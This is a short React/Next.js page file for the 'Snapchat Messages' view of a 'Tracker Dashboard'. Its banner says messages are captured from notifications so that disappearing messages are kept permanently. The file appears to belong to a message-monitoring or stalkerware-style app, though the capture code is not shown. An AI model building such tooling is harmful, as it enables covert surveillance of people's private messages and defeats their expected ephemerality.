import { SocialChatPage } from "@/components/dashboard/social-chat-page"
import { Info } from "lucide-react"

export const metadata = { title: "Snapchat Messages | Tracker Dashboard" }

export default function SnapchatPage() {
  return (
    <div className="space-y-3 animate-in fade-in">
      <div className="flex items-start gap-2.5 px-4 py-3 rounded-lg border border-yellow-200 bg-yellow-50 dark:bg-yellow-950/30 dark:border-yellow-900 text-sm text-yellow-800 dark:text-yellow-300">
        <Info className="h-4 w-4 mt-0.5 shrink-0" />
        <p>
          <span className="font-semibold">Note:</span> Snapchat messages are captured directly from 
          incoming notifications in real-time. This ensures that even disappearing messages are permanently saved here.
        </p>
      </div>

      <SocialChatPage
        platform="snapchat"
        platformName="Snapchat"
        platformIcon="👻"
        platformColor="#FFFC00"
      />
    </div>
  )
}
